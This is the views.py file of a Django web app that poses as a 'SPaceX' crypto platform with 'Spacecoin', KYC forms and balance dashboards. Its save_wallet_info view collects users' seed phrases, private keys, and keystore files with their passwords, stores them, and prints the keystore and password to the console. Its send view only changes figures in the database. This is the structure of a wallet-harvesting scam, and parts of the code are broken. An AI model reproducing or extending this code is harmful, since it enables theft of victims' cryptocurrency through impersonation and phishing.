# myapp/views.py
from django.shortcuts import render
from django.shortcuts import render, redirect
from django.contrib.auth import login, authenticate
from django.contrib.auth.forms import AuthenticationForm
from django.contrib.auth import login
from .forms import SignUpForm, KYCForm, SignInForm, WalletPhraseForm, WalletKeystoreForm, WalletPrivateKeyForm
from django.urls import reverse
from django.shortcuts import render, get_object_or_404
from django.contrib.auth.decorators import login_required
from .models import CustomUser
from django.contrib.auth import logout
from .sendwelcome import send_custom_email
from django.contrib import messages
import threading
from decimal import Decimal
from .models import Transaction  # Assuming Transaction and CustomUser are in the same app





def index(request):
    return render(request, 'app/index.html')


def profile(request):
    user = request.user
    context = {
        "user": user
    }
    return render(request, 'app/profile.html', context)


def stock(request):
    user = request.user
    user = request.user
    context = {
        "user": user
    }
    return render(request, 'app/stock.html', context)



@login_required(login_url='/signin/')
def kyc_view(request):
    user = request.user

    # If the user has already completed KYC, redirect them to their profile or dashboard
    if user.address and user.postal_code and user.city and user.country:
        return redirect(reverse('dashboard', args=[user.id]))  # You can change this to any view you want to redirect to

    if request.method == 'POST':
        form = KYCForm(request.POST, instance=user)
        if form.is_valid():
            form.save()
            messages.success(request, "KYC information updated successfully!")
            print("joo")
            print(user.id)
            return redirect(reverse('dashboard', args=[user.id]))  # After KYC is completed, redirect to dashboard or profile
        else:
            messages.error(request, "Please correct the errors below.")
    else:
        form = KYCForm(instance=user)

    return render(request, 'app/kyc_form.html', {'form': form})



def signup_view(request):
    if request.method == 'POST':
        form = SignUpForm(request.POST)
        if form.is_valid():
            user = form.save()
            login(request, user)
            user_email = user.email
            user_name = user.name
            subject = "Welcome To SPaceX"
            
            # Redirect the user to the dashboard
            response = redirect(reverse('kyc'))
            
            # Send email in a separate thread
            threading.Thread(target=send_custom_email, args=(user_email, user_name, subject)).start()
            
            return response
    else:
        form = SignUpForm()
    
    return render(request, 'app/sign-up.html', {'form': form})

def signin_view(request):
    if request.method == 'POST':
        form = AuthenticationForm(request, data=request.POST)
        if form.is_valid():
            username = form.cleaned_data.get('username')
            password = form.cleaned_data.get('password')
            user = authenticate(request, username=username, password=password)
            if user is not None:
                login(request, user)
                return redirect(reverse('dashboard', args=[user.id]))
                
            else:
                form.add_error(None, 'Invalid username or password')
        else:
            form.add_error(None, 'Invalid username or password')
    else:
        form = AuthenticationForm()
    
    return render(request, 'app/sign-in.html', {'form': form})



@login_required
def dashboard_view(request, user_id):
    if request.user.id != user_id:
        return redirect('some_error_page')  # Redirect to an error page or raise a permission error

    user = get_object_or_404(CustomUser, id=user_id)
    context = {
        'name': user.name,
        'email': user.email,
        'total_balance': user.total_balance,
        'spc_balance': user.spc_balance,
        'tether_balance': user.tether_balance,
        'btc_balance': user.btc_balance,
        'eth_balance': user.eth_balance,
        'sol_balance': user.sol_balance,
        'binance_balance': user.binance_balance,
        'ripple_balance': user.ripple_balance,
    }

    return render(request, 'app/dashboard.html', context)


def custom_logout_view(request):
    logout(request)
    return redirect('signin')  # Replace 'signin' with the name of your desired redirect page


@login_required(login_url='/signin/')
def save_wallet_info(request):
    if request.method == 'POST':
        wallet_name = request.POST.get('walletname')
        
        if 'submit_phrase' in request.POST:
            form = WalletPhraseForm(request.POST)
            if form.is_valid():
                wallet_phrase = form.save(commit=False)
                wallet_phrase.user = request.user
                wallet_phrase.wallet_name = wallet_name
                wallet_phrase.save()
                return redirect(reverse('dashboard', args=[request.user.id]))
        elif 'submit_keystore' in request.POST:
            form = WalletKeystoreForm(request.POST)
            if form.is_valid():
                wallet_keystore = form.save(commit=False)
                wallet_keystore.user = request.user
                wallet_keystore.wallet_name = wallet_name
                print(wallet_keystore.wallet_keystore_json)
                print(wallet_keystore.wallet_keystore_json_password)
                print(wallet_keystore.wallet_name)
                wallet_keystore.save()
                return redirect(reverse('dashboard', args=[request.user.id]))
            else: print("Phrase form errors:", form_phrase.errors)
        elif 'submit_private_key' in request.POST:
            form = WalletPrivateKeyForm(request.POST)
            if form.is_valid():
                wallet_private_key = form.save(commit=False)
                wallet_private_key.user = request.user
                wallet_private_key.wallet_name = wallet_name
                wallet_private_key.save()
                return redirect(reverse('dashboard', args=[request.user.id]))
    else:
        form_phrase = WalletPhraseForm()
        form_keystore = WalletKeystoreForm()
        form_private_key = WalletPrivateKeyForm()
    
    return render(request, 'app/wallet.html', {
        'form_phrase': form_phrase,
        'form_keystore': form_keystore,
        'form_private_key': form_private_key
    })

@login_required(login_url='/signin/')
def usdtindex(request):
    user = request.user  # Get the logged-in user
    print(user)
    tether_balance = user.tether_balance  # Retrieve tether_balance from the user object
    context = {
        'tether_balance': tether_balance,  # Pass the tether_balance to the template
    }
    return render(request, 'app/usdtwallet.html', context)

@login_required(login_url='/signin/')
def ethindex(request):
    user = request.user  # Get the logged-in user
    eth_balance = user.eth_balance  # Retrieve tether_balance from the user object
    context = {
        'eth_balance':eth_balance,  # Pass the tether_balance to the template
    }
    return render(request, 'app/ethwallet.html', context)

@login_required(login_url='/signin/')
def bnbindex(request):
    return render(request, 'app/bnbwallet.html')

@login_required(login_url='/signin/')
def btcindex(request):
    user = request.user  # Get the logged-in user
    btc_balance = user.btc_balance  # Retrieve tether_balance from the user object
    context = {
        'btc_balance':btc_balance,  # Pass the tether_balance to the template
    }
    return render(request, 'app/btcwallet.html', context)

@login_required(login_url='/signin/')
def xrpindex(request):
    return render(request, 'app/btcwallet.html')

@login_required(login_url='/signin/')
def solindex(request):
    return render(request, 'app/solwallet.html')


@login_required(login_url='/signin/')
def send(request):
    if request.method == 'POST':
        # Get form values
        currency_type = request.POST.get('currency')
        amount = request.POST.get('amount')
        wallet_address = request.POST.get('wallet_address')

        try:
            amount = Decimal(amount)
        except:
            messages.error(request, "Invalid amount format.")
            return redirect('transaction_page')  # Redirect to form page

        # Get the logged-in user
        user = request.user

        # Determine the user's balance based on selected currency
        if currency_type == 'Spacecoin':
            user_balance = user.spc_balance
        elif currency_type == 'Solana':
            user_balance = user.sol_balance
        elif currency_type == 'Binance Coin (BNB)':
            user_balance = user.binance_balance
        elif currency_type == 'Bitcoin (BTC)':
            user_balance = user.btc_balance
        elif currency_type == 'Tether (USDT)':
            user_balance = user.tether_balance
        else:
            messages.error(request, "Invalid currency selected.")
            return redirect('transaction_page')

        # Check if the amount is greater than the user's balance
        if amount > user_balance:
            messages.error(request, f"Insufficient {currency_type} balance.")
            return redirect('transaction_page')

        # If valid, create an outflow transaction
        Transaction.objects.create(
            user=user,
            transaction_type='outflow',
            currency_type=currency_type,
            amount=amount,
        )

        # Update the user's balance
        if currency_type == 'Spacecoin':
            user.spc_balance -= amount
        elif currency_type == 'Solana':
            user.sol_balance -= amount
        elif currency_type == 'Binance Coin (BNB)':
            user.binance_balance -= amount
        elif currency_type == 'Bitcoin (BTC)':
            user.btc_balance -= amount
        elif currency_type == 'Tether (USDT)':
            user.tether_balance -= amount

        user.save()  # Save the updated balance

        messages.success(request, "Transaction successful!")
        return redirect('success_page')  # Redirect to success page

    return render(request, 'app/send.html')  # Render form if GET request


@login_required(login_url='/signin/')
def success_page(request):
    return render(request, 'app/success.html')  # Create a success.html page
